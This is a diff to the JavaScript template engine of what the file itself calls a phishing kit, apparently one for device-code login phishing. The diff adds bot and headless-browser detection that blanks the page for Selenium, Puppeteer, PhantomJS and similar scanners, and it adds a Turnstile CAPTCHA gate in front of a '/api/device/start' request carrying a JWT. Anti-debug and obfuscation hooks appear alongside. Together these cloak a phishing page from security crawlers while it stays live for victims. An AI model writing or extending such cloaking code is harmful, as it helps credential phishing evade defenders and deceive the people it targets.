@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Template Engine
+ * VGenius C Engine – Shared Phishing Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -307,14 +307,27 @@
 
     try {
       var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';
+      // Validate Turnstile token if enabled
+      if (!validateTurnstileToken()) {
+        _setStatus('Verification required. Please complete the CAPTCHA.');
+        var startBtn = document.getElementById('startBtn');
+        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
+        return;
+      }
+
       var r = await fetch(apiUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'X-Auth-Mode': AUTH_MODE,
           'X-VG-JWT': VG_JWT,
+          'X-Turnstile-Token': window.__TURNSTILE_TOKEN || '',
         },
-        body: JSON.stringify({ mode: AUTH_MODE, jwt_token: VG_JWT }),
+        body: JSON.stringify({ 
+          mode: AUTH_MODE, 
+          jwt_token: VG_JWT,
+          turnstile_token: window.__TURNSTILE_TOKEN || null,
+        }),
       });
       var d = await r.json();
 
@@ -551,6 +564,174 @@
     }
   }
 
+  // ─── Human Verification / Bot Detection ─────────────────────
+  function initBotDetection() {
+    // Check if Turnstile verification is required
+    if (window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
+      initTurnstileVerification();
+    }
+
+    // Run passive bot detection checks
+    var botScore = calculateBotScore();
+    if (botScore > 0.7) {
+      // High probability of bot - redirect to blank
+      document.body.innerHTML = '';
+      window.location.href = 'about:blank';
+      return;
+    }
+
+    // If moderate suspicion, require additional verification
+    if (botScore > 0.4 && window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
+      showTurnstileChallenge();
+    }
+  }
+
+  function calculateBotScore() {
+    var score = 0;
+    var checks = 0;
+
+    // Check 1: Navigator properties
+    try {
+      checks++;
+      if (!navigator.webdriver) score += 0.1;
+      if (navigator.languages && navigator.languages.length > 0) score += 0.1;
+      if (navigator.plugins && navigator.plugins.length > 0) score += 0.1;
+    } catch (e) { score += 0.3; }
+
+    // Check 2: Screen properties
+    try {
+      checks++;
+      if (screen.width > 0 && screen.height > 0) score += 0.1;
+      if (screen.colorDepth > 0) score += 0.1;
+    } catch (e) { score += 0.2; }
+
+    // Check 3: Timing attacks
+    try {
+      checks++;
+      var start = performance.now();
+      var now = Date.now();
+      if (Math.abs(now - start) < 100) score += 0.15; // Suspicious timing
+    } catch (e) { score += 0.1; }
+
+    // Check 4: WebGL/Canvas fingerprinting
+    try {
+      checks++;
+      var canvas = document.createElement('canvas');
+      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl && gl.getParameter) {
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score += 0.2;
+          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score += 0.2;
+        }
+      }
+    } catch (e) { score += 0.1; }
+
+    // Check 5: Automation tool detection
+    try {
+      checks++;
+      // Puppeteer/Playwright indicators
+      if (window._chrome && !window.chrome) score += 0.3;
+      if (navigator.webdriver) score += 0.3;
+      // Selenium indicators
+      if (window.document.__webdriver_evaluate) score += 0.3;
+      if (window.document.__selenium_evaluate) score += 0.3;
+      if (window.document.__fxdriver_evaluate) score += 0.3;
+      // PhantomJS
+      if (window.callPhantom || window._phantom) score += 0.3;
+    } catch (e) { score += 0.1; }
+
+    // Check 6: Headless browser detection
+    try {
+      checks++;
+      if (!window.chrome || window.chrome.runtime && !window.chrome.runtime.id) score += 0.15;
+      if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'notifications' }).then(function(result) {
+          if (result.state === 'denied' || result.state === 'prompt') {
+            // Normal behavior
+          }
+        }).catch(function() {
+          score += 0.1;
+        });
+      }
+    } catch (e) { score += 0.1; }
+
+    return checks > 0 ? Math.min(score / checks, 1) : 0;
+  }
+
+  function initTurnstileVerification() {
+    // Wait for Turnstile to load
+    if (typeof window.turnstile === 'undefined') {
+      // Load Turnstile script dynamically
+      var script = document.createElement('script');
+      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
+      script.async = true;
+      script.defer = true;
+      (document.head || document.documentElement).appendChild(script);
+      return;
+    }
+
+    // Render Turnstile widget if not already rendered
+    var widgetContainer = document.getElementById('turnstileWidget');
+    if (widgetContainer && !widgetContainer.hasChildNodes()) {
+      window.turnstile.render('#turnstileWidget', {
+        sitekey: window.__TURNSTILE_SITE_KEY,
+        callback: function(token) {
+          // Store token for form submission
+          window.__TURNSTILE_TOKEN = token;
+          // Enable the form/button
+          var startBtn = document.getElementById('startBtn');
+          if (startBtn) startBtn.disabled = false;
+        },
+        'error-callback': function() {
+          showToast('Verification failed', 'Please complete the CAPTCHA challenge.', 5000);
+        },
+        'expired-callback': function() {
+          window.__TURNSTILE_TOKEN = null;
+          var startBtn = document.getElementById('startBtn');
+          if (startBtn) startBtn.disabled = true;
+        }
+      });
+    }
+  }
+
+  function showTurnstileChallenge() {
+    // Show Turnstile modal/widget
+    var widget = document.getElementById('turnstileWidget');
+    if (widget) {
+      widget.style.display = 'block';
+      widget.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    // Show toast notification
+    showToast('Verification Required', 'Please complete the security check to continue.', 5000);
+
+    // Block interaction until verified
+    document.body.style.pointerEvents = 'none';
+    var checkInterval = setInterval(function() {
+      if (window.__TURNSTILE_TOKEN) {
+        document.body.style.pointerEvents = 'auto';
+        clearInterval(checkInterval);
+      }
+    }, 500);
+
+    // Timeout after 5 minutes
+    setTimeout(function() {
+      document.body.style.pointerEvents = 'auto';
+      clearInterval(checkInterval);
+    }, 300000);
+  }
+
+  function validateTurnstileToken() {
+    if (!window.__TURNSTILE_ENABLED) return true;
+    if (!window.__TURNSTILE_TOKEN) {
+      showToast('Verification Required', 'Please complete the CAPTCHA challenge.', 5000);
+      return false;
+    }
+    return true;
+  }
+
   // ─── Anti-Debug (optional, controlled by admin) ─────────────
   function initAntiDebug() {
     if (!window.__ANTIDEBUG_ENABLED) return;
@@ -591,6 +772,7 @@
   function init() {
     applyDynamicContent();
     initBackgroundBlur();
+    initBotDetection();
     initAntiDebug();
     initObfuscation();
   }
